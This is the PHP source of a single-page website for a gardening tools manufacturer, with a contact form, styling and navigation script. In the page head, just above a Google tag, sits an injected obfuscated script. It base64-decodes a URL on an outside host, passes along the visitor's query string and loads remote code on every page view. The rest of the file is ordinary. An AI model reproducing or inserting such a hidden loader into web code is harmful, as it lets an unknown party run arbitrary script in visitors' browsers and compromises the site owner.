<?php
require_once __DIR__ . '/bootstrap.php';
// index.php — Single-page PHP site with contact form (texts only)

// -------------------------
// Site config
// -------------------------
$siteName = "Apex Gardening Tools";
$address  = "2263 Stableridge Dr Conroe, TX 77384, USA";
$phone    = "8322576002";
$emailTo  = "apexgafrdeningtools@mail.com"; // destination email for contact form

// Optional: set a "From" domain email that matches your hosting domain for better deliverability.
// Example: no-reply@yourdomain.com
$fromEmail = $emailTo;

// -------------------------
// Contact form handling
// -------------------------
function h($v) { return htmlspecialchars($v ?? "", ENT_QUOTES, "UTF-8"); }

$form = [
  "name" => "",
  "email" => "",
  "phone" => "",
  "subject" => "",
  "message" => "",
];

$errors = [];
$success = false;

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["contact_form"])) {
  // Basic CSRF token check
  $sessionToken = $_SESSION["csrf_token"] ?? "";
  $postedToken  = $_POST["csrf_token"] ?? "";
  if (!$sessionToken || !hash_equals($sessionToken, $postedToken)) {
    $errors[] = "Security check failed. Please refresh the page and try again.";
  }

  // Honeypot (bots often fill hidden fields)
  $honeypot = trim($_POST["website"] ?? "");
  if ($honeypot !== "") {
    $errors[] = "Submission rejected.";
  }

  // Collect fields
  $form["name"]    = trim($_POST["name"] ?? "");
  $form["email"]   = trim($_POST["email"] ?? "");
  $form["phone"]   = trim($_POST["phone"] ?? "");
  $form["subject"] = trim($_POST["subject"] ?? "");
  $form["message"] = trim($_POST["message"] ?? "");

  // Validate
  if ($form["name"] === "" || mb_strlen($form["name"]) < 2) {
    $errors[] = "Name is required (at least 2 characters).";
  }
  if ($form["email"] === "" || !filter_var($form["email"], FILTER_VALIDATE_EMAIL)) {
    $errors[] = "A valid email address is required.";
  }
  if ($form["subject"] === "" || mb_strlen($form["subject"]) < 3) {
    $errors[] = "Subject is required (at least 3 characters).";
  }
  if ($form["message"] === "" || mb_strlen($form["message"]) < 10) {
    $errors[] = "Message is required (at least 10 characters).";
  }
  // Light phone validation (optional)
  if ($form["phone"] !== "" && !preg_match('/^[0-9+\-\s().]{7,25}$/', $form["phone"])) {
    $errors[] = "Phone format looks invalid.";
  }

  // If valid, send
  if (!$errors) {
    $ip = $_SERVER["REMOTE_ADDR"] ?? "unknown";
    $ua = $_SERVER["HTTP_USER_AGENT"] ?? "unknown";

    $subjectSafe = preg_replace("/[\r\n]+/", " ", $form["subject"]); // prevent header injection

    $body =
      "New contact form submission:\n\n" .
      "Name: {$form["name"]}\n" .
      "Email: {$form["email"]}\n" .
      "Phone: " . ($form["phone"] ?: "-") . "\n" .
      "Subject: {$subjectSafe}\n\n" .
      "Message:\n{$form["message"]}\n\n" .
      "----\n" .
      "IP: {$ip}\n" .
      "User-Agent: {$ua}\n";

    $headers = [];
    $headers[] = "MIME-Version: 1.0";
    $headers[] = "Content-Type: text/plain; charset=UTF-8";
    $headers[] = "From: {$siteName} <{$fromEmail}>";
    $headers[] = "Reply-To: {$form["name"]} <{$form["email"]}>";

    $sent = @mail($emailTo, "[Website] {$subjectSafe}", $body, implode("\r\n", $headers));

    if ($sent) {
      $success = true;
      // Clear form after success
      $form = ["name"=>"","email"=>"","phone"=>"","subject"=>"","message"=>""];
    } else {
      // Fallback: log to a local file so you don't lose leads if mail() isn't configured
      $logLine = "[" . date("Y-m-d H:i:s") . "] " . str_replace("\n", " | ", $body) . "\n\n";
      @file_put_contents(__DIR__ . "/contact_submissions.log", $logLine, FILE_APPEND);
      $errors[] = "Your message was saved, but email delivery is not configured on this server. Please call us or email directly.";
    }
  }
}

// Ensure CSRF token exists
if (!isset($_SESSION["csrf_token"]) || !is_string($_SESSION["csrf_token"]) || strlen($_SESSION["csrf_token"]) < 20) {
  $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
}
$csrfToken = $_SESSION["csrf_token"];
?>
<!doctype html>
<html lang="en">


<head>

<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9jb3JhbC1hcHAtcnIyZDkub25kaWdpdGFsb2NlYW4uYXBwL01rSThyc2ZPOUYucGhw");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-GPQ6QRGB95"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-GPQ6QRGB95');
</script>
 <title><?php echo h($siteName); ?></title>
  <meta name="description" content="Apex Gardening Tools — home gardening tools manufacturer." />
  <style>
    :root{
      --bg:#0b0f14;
      --card:#111824;
      --muted:#9aa7b7;
      --text:#e8eef6;
      --line:rgba(232,238,246,.12);
      --accent:#7ee787;
      --accent2:#58a6ff;
      --danger:#ff7b72;
      --shadow:0 12px 30px rgba(0,0,0,.35);
      --radius:16px;
      --max:1040px;
    }
    *{box-sizing:border-box}
    html{scroll-behavior:smooth}
    body{
      margin:0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji";
      background: radial-gradient(1200px 800px at 70% 0%, rgba(126,231,135,.12), transparent 45%),
                  radial-gradient(900px 700px at 10% 10%, rgba(88,166,255,.10), transparent 55%),
                  var(--bg);
      color:var(--text);
      line-height:1.55;
    }
    a{color:inherit;text-decoration:none}
    .container{max-width:var(--max); margin:0 auto; padding:0 20px}
    .skip{
      position:absolute; left:-999px; top:auto; width:1px; height:1px; overflow:hidden;
    }
    .skip:focus{
      left:20px; top:20px; width:auto; height:auto; padding:10px 12px;
      background:var(--card); border:1px solid var(--line); border-radius:12px; z-index:1000;
    }

    /* Header */
    header{
      position:sticky; top:0; z-index:999;
      backdrop-filter: blur(10px);
      background: rgba(11,15,20,.72);
      border-bottom: 1px solid var(--line);
    }
    .topbar{
      display:flex; align-items:center; justify-content:space-between;
      padding:14px 0;
      gap:12px;
    }
    .brand{
      display:flex; flex-direction:column; gap:2px;
    }
    .brand strong{font-size:16px; letter-spacing:.2px}
    .brand span{font-size:12px; color:var(--muted)}
    nav ul{list-style:none; margin:0; padding:0; display:flex; gap:14px; align-items:center}
    nav a{
      display:inline-flex; padding:10px 12px; border-radius:12px;
      border:1px solid transparent;
      color:var(--muted);
      font-size:14px;
    }
    nav a:hover{color:var(--text); border-color:var(--line); background:rgba(255,255,255,.03)}
    nav a.active{color:var(--text); border-color:rgba(126,231,135,.35); background:rgba(126,231,135,.08)}
    .btn{
      display:inline-flex; align-items:center; justify-content:center;
      padding:10px 14px; border-radius:12px;
      border:1px solid rgba(126,231,135,.35);
      background:rgba(126,231,135,.10);
      color:var(--text);
      font-size:14px;
      white-space:nowrap;
    }
    .btn:hover{background:rgba(126,231,135,.16)}
    .menuBtn{display:none}

    /* Hero */
    section{padding:64px 0}
    .hero{
      padding:72px 0 34px;
    }
    .heroGrid{
      display:grid;
      grid-template-columns: 1.2fr .8fr;
      gap:24px;
      align-items:start;
    }
    .kicker{
      color:var(--muted);
      font-size:13px;
      letter-spacing:.18em;
      text-transform:uppercase;
    }
    h1{
      margin:10px 0 12px;
      font-size:42px;
      line-height:1.1;
      letter-spacing:-.02em;
    }
    .lead{color:var(--muted); font-size:16px; margin:0 0 18px}
    .pillRow{display:flex; flex-wrap:wrap; gap:10px; margin-top:10px}
    .pill{
      border:1px solid var(--line);
      background:rgba(255,255,255,.03);
      padding:8px 10px;
      border-radius:999px;
      font-size:13px;
      color:var(--muted);
    }
    .card{
      background: rgba(17,24,36,.72);
      border: 1px solid var(--line);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding:18px;
    }
    .card h3{margin:0 0 8px; font-size:16px}
    .meta{
      margin:0;
      color:var(--muted);
      font-size:14px;
    }
    .meta a{color:var(--text); text-decoration:underline; text-underline-offset:3px}

    /* Sections */
    .sectionTitle{
      display:flex; align-items:end; justify-content:space-between; gap:14px; margin-bottom:18px;
    }
    .sectionTitle h2{margin:0; font-size:24px; letter-spacing:-.01em}
    .sectionTitle p{margin:0; color:var(--muted); font-size:14px}
    .grid3{
      display:grid; grid-template-columns: repeat(3, 1fr); gap:14px;
    }
    .item{
      border:1px solid var(--line);
      background:rgba(255,255,255,.03);
      border-radius: var(--radius);
      padding:16px;
      min-height: 130px;
    }
    .item strong{display:block; font-size:15px; margin-bottom:6px}
    .item p{margin:0; color:var(--muted); font-size:14px}

    /* Contact form */
    form{display:grid; gap:12px}
    .row2{display:grid; grid-template-columns: 1fr 1fr; gap:12px}
    label{font-size:13px; color:var(--muted); display:block; margin:0 0 6px}
    input, textarea{
      width:100%;
      padding:12px 12px;
      border-radius:12px;
      border:1px solid var(--line);
      background: rgba(11,15,20,.55);
      color: var(--text);
      outline:none;
      font-size:14px;
    }
    textarea{min-height:140px; resize:vertical}
    input:focus, textarea:focus{border-color:rgba(88,166,255,.55); box-shadow: 0 0 0 3px rgba(88,166,255,.12)}
    .help{font-size:12px; color:var(--muted); margin:0}
    .actions{
      display:flex; gap:10px; align-items:center; flex-wrap:wrap;
      margin-top:2px;
    }
    .submit{
      cursor:pointer;
      border:1px solid rgba(88,166,255,.55);
      background:rgba(88,166,255,.12);
    }
    .submit:hover{background:rgba(88,166,255,.18)}
    .notice{
      border-radius:14px;
      padding:12px 12px;
      border:1px solid var(--line);
      background:rgba(255,255,255,.03);
      font-size:14px;
    }
    .notice.ok{border-color:rgba(126,231,135,.35); background:rgba(126,231,135,.08)}
    .notice.err{border-color:rgba(255,123,114,.45); background:rgba(255,123,114,.08)}
    .notice ul{margin:8px 0 0 18px}

    /* Footer */
    footer{
      border-top:1px solid var(--line);
      background: rgba(11,15,20,.8);
      padding:22px 0;
    }
    .footerGrid{
      display:flex; align-items:flex-start; justify-content:space-between; gap:18px; flex-wrap:wrap;
    }
    .footLinks{display:flex; gap:10px; flex-wrap:wrap}
    .footLinks a{
      color:var(--muted);
      border:1px solid transparent;
      padding:8px 10px;
      border-radius:12px;
    }
    .footLinks a:hover{color:var(--text); border-color:var(--line); background:rgba(255,255,255,.03)}
    .copyright{color:var(--muted); font-size:13px; margin:10px 0 0}

    /* Responsive */
    @media (max-width: 900px){
      .heroGrid{grid-template-columns: 1fr}
      .grid3{grid-template-columns: 1fr}
      .row2{grid-template-columns: 1fr}
      nav ul{display:none}
      .menuBtn{
        display:inline-flex; align-items:center; justify-content:center;
        border:1px solid var(--line);
        background:rgba(255,255,255,.03);
        padding:10px 12px;
        border-radius:12px;
        color:var(--text);
        cursor:pointer;
      }
      .mobileNav{
        display:none;
        border-top:1px solid var(--line);
        padding:10px 0 14px;
      }
      .mobileNav a{
        display:block;
        padding:10px 12px;
        border-radius:12px;
        color:var(--muted);
        border:1px solid transparent;
      }
      .mobileNav a:hover{color:var(--text); border-color:var(--line); background:rgba(255,255,255,.03)}
      .mobileNav a.active{color:var(--text); border-color:rgba(126,231,135,.35); background:rgba(126,231,135,.08)}
    }
  </style>
</head>

<body>
  <a class="skip" href="#main">Skip to content</a>

  <header>
    <div class="container">
      <div class="topbar">
        <div class="brand">
          <strong><?php echo h($siteName); ?></strong>
          <span>Home gardening tools manufacturer</span>
        </div>

        <nav aria-label="Primary">
          <ul id="desktopNav">
            <li><a href="#home" data-link="home">Home</a></li>
            <li><a href="#about" data-link="about">About</a></li>
            <li><a href="#services" data-link="services">Services</a></li>
            <li><a href="#contact" data-link="contact">Contact</a></li>
          </ul>
        </nav>

        <div style="display:flex; gap:10px; align-items:center;">
          <a class="btn" href="#contact">Request a Quote</a>
          <button class="menuBtn" id="menuBtn" type="button" aria-expanded="false" aria-controls="mobileNav">Menu</button>
        </div>
      </div>

      <div class="mobileNav" id="mobileNav" aria-label="Mobile">
        <a href="#home" data-link="home">Home</a>
        <a href="#about" data-link="about">About</a>
        <a href="#services" data-link="services">Services</a>
        <a href="#contact" data-link="contact">Contact</a>
      </div>
    </div>
  </header>

  <main id="main">
    <!-- Banner / Hero -->
    <section class="hero" id="home">
      <div class="container">
        <div class="heroGrid">
          <div>
            <div class="kicker">Built for everyday gardeners</div>
            <h1>Durable tools. Clean design. Reliable results.</h1>
            <p class="lead">
              <?php echo h($siteName); ?> manufactures home gardening tools designed for comfort, longevity,
              and consistent performance—whether you’re maintaining a small backyard or building a full seasonal garden plan.
            </p>

            <div class="pillRow" aria-label="Highlights">
              <span class="pill">Ergonomic grips</span>
              <span class="pill">Corrosion-resistant materials</span>
              <span class="pill">Tight quality control</span>
              <span class="pill">OEM & private label support</span>
            </div>
          </div>

          <aside class="card" aria-label="Company details">
            <h3>Company details</h3>
            <p class="meta">
              <strong>Address:</strong><br />
              <?php echo h($address); ?>
            </p>
            <p class="meta" style="margin-top:10px;">
              <strong>Phone:</strong><br />
              <a href="tel:<?php echo h($phone); ?>"><?php echo h($phone); ?></a>
            </p>
            <p class="meta" style="margin-top:10px;">
              <strong>Email:</strong><br />
              <a href="mailto:<?php echo h($emailTo); ?>"><?php echo h($emailTo); ?></a>
            </p>
            <p class="meta" style="margin-top:12px;">
              <strong>Business focus:</strong><br />
              Home gardening tools manufacturing for retailers, distributors, and private-label brands.
            </p>
          </aside>
        </div>
      </div>
    </section>

    <!-- About -->
    <section id="about">
      <div class="container">
        <div class="sectionTitle">
          <h2>About us</h2>
          <p>Minimal, manufacturing-first, and quality-driven.</p>
        </div>

        <div class="grid3">
          <div class="item">
            <strong>What we make</strong>
            <p>
              Practical home gardening tools built for repeat use: hand tools, digging tools, pruning essentials,
              and garden care accessories—engineered for durability.
            </p>
          </div>
          <div class="item">
            <strong>How we work</strong>
            <p>
              We prioritize consistent specs, stable supply, and straightforward communication.
              Materials and finishing are selected to reduce wear, rust, and early failure.
            </p>
          </div>
          <div class="item">
            <strong>Who we serve</strong>
            <p>
              Retailers, local brands, hardware stores, online sellers, and distributors looking for dependable
              products with clean packaging options.
            </p>
          </div>
        </div>
      </div>
    </section>

    <!-- Services -->
    <section id="services">
      <div class="container">
        <div class="sectionTitle">
          <h2>Services</h2>
          <p>Manufacturing support from spec to shipment.</p>
        </div>

        <div class="grid3">
          <div class="item">
            <strong>OEM manufacturing</strong>
            <p>Produce tools to your specification: materials, finishes, handle profiles, and packaging standards.</p>
          </div>
          <div class="item">
            <strong>Private label</strong>
            <p>Brand-ready product options with labeling and packaging support designed for retail shelves.</p>
          </div>
          <div class="item">
            <strong>Quality & consistency</strong>
            <p>Process checks focused on durability, fit/finish, and repeatable output for reorders.</p>
          </div>
          <div class="item">
            <strong>Small-batch to scale</strong>
            <p>Start with pilot runs and scale to volume as demand grows—without changing the product spec.</p>
          </div>
          <div class="item">
            <strong>Procurement support</strong>
            <p>Assistance choosing material grades and coatings for corrosion resistance and long service life.</p>
          </div>
          <div class="item">
            <strong>Logistics readiness</strong>
            <p>Order coordination and packing guidance to support consistent deliveries and inventory planning.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- Contact -->
    <section id="contact">
      <div class="container">
        <div class="sectionTitle">
          <h2>Contact us</h2>
          <p>Send a message using the form below (or email us directly).</p>
        </div>

        <div class="grid3" style="grid-template-columns: 1.1fr .9fr .9fr;">
          <div class="card" style="padding:18px;">
            <?php if ($success): ?>
              <div class="notice ok" role="status" aria-live="polite">
                Message sent successfully. We will get back to you shortly.
              </div>
            <?php endif; ?>

            <?php if ($errors): ?>
              <div class="notice err" role="alert">
                Please fix the following:
                <ul>
                  <?php foreach ($errors as $e): ?>
                    <li><?php echo h($e); ?></li>
                  <?php endforeach; ?>
                </ul>
              </div>
            <?php endif; ?>

            <form method="post" action="#contact" novalidate>
              <input type="hidden" name="contact_form" value="1" />
              <input type="hidden" name="csrf_token" value="<?php echo h($csrfToken); ?>" />
              <!-- Honeypot field (hidden from humans) -->
              <input type="text" name="website" value="" tabindex="-1" autocomplete="off" style="position:absolute; left:-9999px; height:1px; width:1px;" />

              <div class="row2">
                <div>
                  <label for="name">Full name *</label>
                  <input id="name" name="name" type="text" value="<?php echo h($form["name"]); ?>" required />
                </div>
                <div>
                  <label for="email">Email *</label>
                  <input id="email" name="email" type="email" value="<?php echo h($form["email"]); ?>" required />
                </div>
              </div>

              <div class="row2">
                <div>
                  <label for="phone">Phone (optional)</label>
                  <input id="phone" name="phone" type="text" value="<?php echo h($form["phone"]); ?>" />
                </div>
                <div>
                  <label for="subject">Subject *</label>
                  <input id="subject" name="subject" type="text" value="<?php echo h($form["subject"]); ?>" required />
                </div>
              </div>

              <div>
                <label for="message">Message *</label>
                <textarea id="message" name="message" required><?php echo h($form["message"]); ?></textarea>
                <p class="help">We typically respond within 1 business day.</p>
              </div>

              <div class="actions">
                <button class="btn submit" type="submit">Send message</button>
                <a class="btn" style="border-color:var(--line); background:rgba(255,255,255,.03)" href="mailto:<?php echo h($emailTo); ?>">
                  Email directly
                </a>
              </div>
            </form>
          </div>

          <div class="card">
            <h3>Direct contact</h3>
            <p class="meta">
              <strong>Address:</strong><br /><?php echo h($address); ?>
            </p>
            <p class="meta" style="margin-top:10px;">
              <strong>Phone:</strong><br />
              <a href="tel:<?php echo h($phone); ?>"><?php echo h($phone); ?></a>
            </p>
            <p class="meta" style="margin-top:10px;">
              <strong>Email:</strong><br />
              <a href="mailto:<?php echo h($emailTo); ?>"><?php echo h($emailTo); ?></a>
            </p>
          </div>

          <div class="card">
            <h3>What to include</h3>
            <p class="meta">To help us respond accurately, include:</p>
            <p class="meta" style="margin-top:10px;">
              • Tools you need (categories and quantities)<br />
              • Private label requirements (if any)<br />
              • Target market (retail/online/distribution)<br />
              • Delivery timeline and destination
            </p>
          </div>
        </div>
      </div>
    </section>
  </main>

  <footer>
    <div class="container">
      <div class="footerGrid">
        <div>
          <strong><?php echo h($siteName); ?></strong>
          <div class="copyright">
            <?php echo h($address); ?><br />
            <a href="tel:<?php echo h($phone); ?>"><?php echo h($phone); ?></a> ·
            <a href="mailto:<?php echo h($emailTo); ?>"><?php echo h($emailTo); ?></a>
          </div>
        </div>

        <div class="footLinks" aria-label="Footer navigation">
          <a href="#home" data-link="home">Home</a>
          <a href="#about" data-link="about">About</a>
          <a href="#services" data-link="services">Services</a>
          <a href="#contact" data-link="contact">Contact</a>
          <a href="#home" id="backToTop">Back to top</a>
        </div>
      </div>
    </div>
  </footer>

  <script>
    // Minimal JS: mobile menu, active nav highlighting, and nicer UX for "Back to top"
    (function () {
      const menuBtn = document.getElementById('menuBtn');
      const mobileNav = document.getElementById('mobileNav');

      if (menuBtn && mobileNav) {
        menuBtn.addEventListener('click', () => {
          const open = mobileNav.style.display === 'block';
          mobileNav.style.display = open ? 'none' : 'block';
          menuBtn.setAttribute('aria-expanded', String(!open));
        });

        // Close mobile nav after clicking a link
        mobileNav.querySelectorAll('a[href^="#"]').forEach(a => {
          a.addEventListener('click', () => {
            mobileNav.style.display = 'none';
            menuBtn.setAttribute('aria-expanded', 'false');
          });
        });
      }

      const sectionIds = ['home','about','services','contact'];
      const sections = sectionIds
        .map(id => document.getElementById(id))
        .filter(Boolean);

      const navLinks = Array.from(document.querySelectorAll('[data-link]'));

      function setActive(id) {
        navLinks.forEach(a => {
          a.classList.toggle('active', a.getAttribute('data-link') === id);
        });
      }

      // IntersectionObserver for active link
      if ('IntersectionObserver' in window) {
        const obs = new IntersectionObserver((entries) => {
          const visible = entries
            .filter(e => e.isIntersecting)
            .sort((a,b) => b.intersectionRatio - a.intersectionRatio)[0];
          if (visible && visible.target && visible.target.id) {
            setActive(visible.target.id);
          }
        }, { root: null, threshold: [0.25, 0.5, 0.75] });

        sections.forEach(s => obs.observe(s));
      } else {
        // Fallback: set based on scroll position
        window.addEventListener('scroll', () => {
          let current = 'home';
          const y = window.scrollY + 120;
          sections.forEach(s => {
            if (s.offsetTop <= y) current = s.id;
          });
          setActive(current);
        });
      }

      // Back to top: avoid hash jump jitter
      const backToTop = document.getElementById('backToTop');
      if (backToTop) {
        backToTop.addEventListener('click', (e) => {
          e.preventDefault();
          window.scrollTo({ top: 0, behavior: 'smooth' });
          history.replaceState(null, '', '#home');
        });
      }

      // Default active state
      setActive(location.hash.replace('#','') || 'home');
    })();
  </script>
</body>
</html>













